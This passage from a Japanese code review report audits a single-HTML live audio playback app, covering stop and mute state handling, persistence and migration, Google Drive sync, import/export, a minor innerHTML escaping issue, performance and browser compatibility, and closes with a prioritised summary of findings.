| MUTE ALL → 全停止 → 全復帰 | 🟡 `panicStop` が `live.muted=null` にするため（L1119）、全復帰後は**ミュートが解除された状態**で戻ります。音は鳴るので事故にはなりませんが、「MUTE中だった」情報は失われます |
| MUTE ALL → 解除 | 🔴 **SEが戻らない** → 指摘2 |
| 全停止 → GO / シーン保存 | ✅ 正常（`beginTransition` L998 と `#sfOk` L1794 が `allOff` を破棄するので、古いスナップショットへ戻る事故を防止） |
| 全停止中に割込フェーダーを動かす → 全復帰 | 🟡 割込は**記録した値で上書き**されます。「戻す」動作としては一貫していますが、直前の操作が消えるので驚きます（要決定事項に挙げました） |

**`panicStop` の入れ子復元は整合するか**: ✅ **`live.allStopped` については整合します**（ディープコピーで保存し、そのまま復元）。ただし `live.scenePaused` と `live.muted` は保存対象外なので、その2つは失われます（指摘1）。

**各ボタンの `disabled` 判定**:

| ボタン | 判定 | 評価 |
| --- | --- | --- |
| シーン停止 | `!scenePaused && !currentSceneId && !currentValues` (L1461) | ✅ 妥当（停止中は押せる、無音時は押せない） |
| ALL STOP | **判定なし**（常に有効） | 🔵 無音時に押しても `wasPlaying=false` で無害ですが（L1065）、「押せるのに何も起きない」ので `disabled` を付けた方が親切です |
| 全停止 | `!allOff && !(sePlaying.size||currentSceneId||interrupt||playing channel)` (L1473) | ✅ 妥当。ただし**SEが自然終了しても再描画されない**ため、有効のまま残ることがあります（無害） |
| MUTE ALL | 関数の先頭で早期 return（L1179）。ボタン自体は常に有効 | 🔵 「押しても何も起きない」状態が見た目で分かりません |
| 上書き | `!!live.trans \|\| !currentSceneId` (L1450) | ✅ 妥当 |

## 3-4. 状態の永続化とマイグレーション

| 観点 | 結果 | 根拠 |
| --- | --- | --- |
| `migrate()` の v1〜v5 冪等性 | ✅ **冪等** | 2回通しても結果が変わらないことをコードで確認: `delete s.trans`（L771）は2回目に no-op、IN/OUT導出は「有効値でなければ」の条件付き（L751）、`loops` の種付けは `typeof !=='boolean'` 判定（L759）、`s.mode` は毎回同じ式で再計算（L770）、`linkXfadeIn` も同値なら書き換えません（L805–807）。自己テスト（test8 の 8-2s）でも実測済み |
| 壊れた `state.json` で落ちないか | ✅ **落ちない** | `Object.assign(blankState(),raw||{})`（L730）で欠損を補完、`Array.isArray` チェック3件（L735–737）、`settings` は既定値マージ＋数値検証（L731–734）、`values`/`seValues`/`loops` は型チェック（L743–745）、`fadeOutSec/fadeInSec` は不正値を削除（L748–749）、`sessions` が空なら生成（L738）、`currentSessionId` の存在確認（L783）。**循環参照は JSON.parse では発生しません**。`state.json` が JSON として壊れている場合も `try/catch` でログのみ（L2751） |
| 400msデバウンスとタブを閉じた時のデータ消失 | 🟡 **対策余地あり** | `pagehide`/`visibilitychange`/`beforeunload` のいずれも未使用 → 指摘19 |
| `DB_VER=1` のままでの将来の変更 | ✅ **詰まりません**（`onblocked` のみ未対応） | `onupgradeneeded` は「無ければ作る」形（L696–698）なので、将来バージョンを上げても既存ストアを保ったまま追加できます。複数タブ時の `onblocked` だけ未処理 → 指摘35 |
| `JSON.parse(JSON.stringify(state))` のコスト | ✅ **現状は問題なし** | `state` に Blob は入らず（音源は `blobs` ストア）、メタデータのみ。音源200件＋シーン100件でも概算200〜400KB程度で、400msデバウンス下では体感に出ません。**将来1000件規模になったら**、保存直前の1回だけに絞る（今は `markDirty` 1回につき1回で既に最小）か `structuredClone` を使うと軽くなります |

## 3-5. Google Drive 同期

| 観点 | 結果 | 根拠 |
| --- | --- | --- |
| 401後の挙動・書き込み途中で切れた場合 | 🔴 **問題あり** | `drive.api` は401でバッジを戻しますが（L2707）、**`upload()` は生fetchなので401がそのまま例外**になり、`scheduleStateUpload` の空catchで消えます（L2781）→ 指摘4。`state.json` は1回のPATCHで全置換なので「途中まで書き込まれた壊れたJSON」は原則できません（Drive側で失敗すれば旧版が残る）。**音源の途中失敗**は「state.jsonには存在するがDriveに無い」不整合になり、リトライもされません |
| `sync()` の競合・複数端末 | 🔴 **上書き事故が起きうる** | 同時実行ロックが無く（L2744）、自動アップロード（3秒後）と手動同期が重なると `state.json` の二重作成が起こりえます → 指摘20。`updatedAt` 比較だけの上書きは指摘5 |
| 音源アップロードが直列・リトライ無し | 🟡 **改善余地** | `sync()` 内で1件ずつ `await`（L2765–2772）。100件×5MBで数分かかり、その間ページを閉じると中断します。`drive.pendingAudio`（L2670）は**宣言されているだけで未使用**なので、これを使った再送キューにするのが素直です |
| クライアントID・`drive.file` スコープ | ✅ **適切** | `drive.file` は「このアプリが作成したファイルのみ」に限定される最小スコープで、Drive全体を読みません。クライアントIDは公開情報なので `state.json` に含めて問題ありません（トークンは保存していません＝正しい判断）。`state.settings.driveClientId` が Drive の state.json 経由で他端末に渡るのも利便性として妥当です |

## 3-6. エクスポート／インポート

| 観点 | 結果 | 根拠 |
| --- | --- | --- |
| 数百MB規模でブラウザが落ちないか | 🟡 **落ちる／無言で失敗する** | Base64化（+33%）した全音源を1つのJSON文字列にします（L2629）。300MBの音源なら文字列は約400MB＋`JSON.stringify` の結果でさらに同量 → V8の文字列上限（約512MB）や端末メモリに当たります。**try/catchが無いので「押しても何も起きない」**（L2626）→ 指摘18。代替案: 音源は個別ファイルで書き出す／`state`のみの軽量エクスポート／`showSaveFilePicker` でのストリーム書き出し（Chrome限定） |
| `atob`/`FileReader` のバイナリ安全性 | ✅ **安全**（ただし `onerror` 無し） | `blobToB64` は `readAsDataURL`（L2624）、`b64ToBlob` は `charCodeAt` でバイト単位に戻しており（L2625）、マルチバイトでも壊れません。**`FileReader` の `onerror` 未設定**で、失敗時にPromiseが永久保留になります → 指摘18 |
| 不正ファイルで既存データを壊す前に検証しているか | 🔴 **していない（削除が先）** | `pack.app` の一致のみ確認して即全削除（L2639–2642）→ 指摘3 |

## 3-7. セキュリティ

| 観点 | 結果 | 根拠 |
| --- | --- | --- |
| `innerHTML` にユーザー入力が混入する経路 | 🔴 **1箇所あり** | 全 `innerHTML` 使用箇所を確認しました。音源名・シーン名・タグ・任意IDは**すべて `textContent` / `.value` 経由**で安全です（L1411, L1572, L1607, L1842, L1971, L2278, L2517–2519 ほか）。**唯一 `#tagList` の `<option>` 生成だけが文字列連結**で、`"` のみのエスケープ（L2476）→ 指摘9 |
| テンプレート文字列で組み立てるセレクタ | 🟡 **`.sePad[data-id="${id}"]` が2箇所** | L1207, L1245。IDは通常UUIDですが、インポート由来のIDは未検証なので `SyntaxError` で再生処理が止まりえます → 指摘22 |
| 外部スクリプト（GIS）の扱い・CSP | 🔵 **改善余地** | GISは必要時のみ動的読込（L2680–2684）で、失敗時のメッセージも親切です。CSPは未設定 → 指摘32（インライン必須の構成なので効果は限定的） |

## 3-8. UI / 操作性の実装面

| 観点 | 結果 | 根拠 |
| --- | --- | --- |
| ショートカットのテキスト入力中の誤爆 | ✅ **誤爆しない**（1点だけ注意） | `INPUT/SELECT/TEXTAREA` にフォーカスがあるとき早期return（L1810）、`dlg.open`/`#sceneCfg.open` でも無効（L1808）、`e.repeat` も除外（L1811）。`e.preventDefault()`（L1812–1813）により、ボタンにフォーカスがある状態の Space/Enter でボタンが二重に押されることもありません。**注意点**: パッド色のパレット（`.palette`, L2599）はdialogではないので、開いている間も 1〜9 でSEが鳴ります（実害は小さいですが、`paletteEl` の判定を足すと丁寧です） |
| `requestAnimationFrame` の常時稼働 | 🔵 **止める余地あり** | 遷移中以外は判定1回のみ（L1267）で実測負荷は微小 → 指摘28 |
| 200件規模の再描画コスト | 🟡 **過剰な呼び出しあり** | ライブラリは50件ページングで守られています（✅）が、`renderPerform()` が入力1文字ごとに呼ばれ、パッド・割込フェーダーのDOMを毎回作り直します（L2009, L2304）→ 指摘13。🎚️ダイアログは全BGM行を一括生成 → 指摘23 |
| `audioById`/`sceneById` の O(n) と O(n²) | 🔵 **O(n²)経路あり（現規模では許容）** | `selectedRows`（L1863）×シーンカード数、`scenesOf()` の毎回Map生成（L830）×カード数、`renderSceneList` の `indexOf`（L1413）→ 指摘27。200件・100シーンで数十msなので、演奏中の操作を妨げるほどではありません |
| `alert`/`confirm` のブロッキング | 🟡 **演奏中に起きうる** | 19箇所。遷移の進行が rAF 依存なので、ダイアログ中はクロスフェードが凍ります → 指摘21 |

## 3-9. 環境依存

| 環境 | 結果 | 根拠 |
| --- | --- | --- |
| iOS Safari / iPadOS | 🟡 **動くが要注意2点** | ジェスチャ内で `AudioContext` を生成（L2958）＝自動再生ポリシーOK。`touch-action:none`＋`setPointerCapture` でフェーダー操作もOK。**注意①** メモリ上限が低く、`engine.buffers` の溜め込みでタブが落ちやすい（指摘6）。**注意②** 中断（着信など）後の自動復帰が無い（3-1）。プライベートブラウズではIndexedDBが使えず起動失敗（指摘7） |
| Android Chrome | ✅ **問題なし** | 使用APIはすべて対応。`crypto.randomUUID` はフォールバックあり（L615） |
| Firefox | 🔵 **動作はする。見た目のみ差** | `::-webkit-slider-thumb` が効かず、マスターバーのつまみが小さいまま（指摘34）。`-moz-appearance:textfield` は指定済み（L239）。IndexedDB/Web Audio/dialog/ResizeObserver はすべて対応 |
| OBS ブラウザソース | 🟡 **クリックできない環境では音が出ない可能性** | 音の解錠は「最初の `pointerdown`」（L2958–2959）に依存します。OBS のブラウザソースは基本的に自動再生が許可されていますが、`AudioContext` が `suspended` で始まった場合、**クリックできないソース設定では復帰手段がありません**。→ 画面内に「▶ 音声を有効化」ボタンを常設し、`ctx.state!=='running'` のときだけ目立たせるのが確実です（中断復帰にも使えます） |
| `file://` 直開き | 🔴 **Chromeでは起動しない（無言）** | IndexedDBが拒否され `init()` が失敗（指摘7）。README には「Drive同期はhttpsが必要」とだけ書かれており、**アプリ自体が起動しない**ことは書かれていません。README に1行追記を推奨します |
| オフライン | ✅ **本体は完全に動作** | 外部依存はGISのみで、動的読込の失敗時に「GISスクリプトを読み込めません（オフライン？）」と明示（L2683）。ローカル保存・再生・編集はすべてオフラインで動きます |

---

# 総評（10行以内）

1. **設計の芯は良い**です。パーミル管理、`max(シーン値, 割込値)` の重ね合わせ、同期/非同期の二段起動、シーンSEとパッドSEの区別は、ライブ用途の要件をよく反映しています。
2. `migrate()` の防御的初期化とライブラリのページングは、この規模の単一HTMLとしては水準以上に丁寧です。
3. 一方で **「停止系4種のスナップショット」だけは構造的に事故が起き続けます**。変数を4つ並列に持つ設計が限界に来ており、1つのスタックへ統合するのが最善です（指摘1）。
4. **データ保護の弱点は「気づけないこと」**です。インポートの削除先行（指摘3）、Driveの無言失敗（指摘4）、時計依存の上書き（指摘5）は、いずれも失敗が見えません。
5. **メモリ戦略の欠落**が実運用で最初に当たる壁だと見ます。デモ音源が短いため見えていません（指摘6）。
6. リアルタイム性については、**初回GOのデコード待ち**（指摘12）と**再描画の呼びすぎ**（指摘13）が体感を落としています。どちらも局所修正で済みます。
7. セキュリティは実用範囲で概ね良好で、**危ないのは `#tagList` の1行だけ**です（指摘9）。他は `textContent` で正しく書けています。
8. 環境依存で唯一の致命は **`file://` と起動失敗時の無反応**（指摘7）。エラーを1つ出すだけで印象が変わります。
9. 修正はいずれも**現構成のまま数行〜数十行**で可能で、大規模な作り替えは不要です。
10. 優先順位は上記「今すぐ直すべき物リスト」のとおり、**指摘1 → 3 → 4 → 6 → 2** から着手するのが最も効果的です。
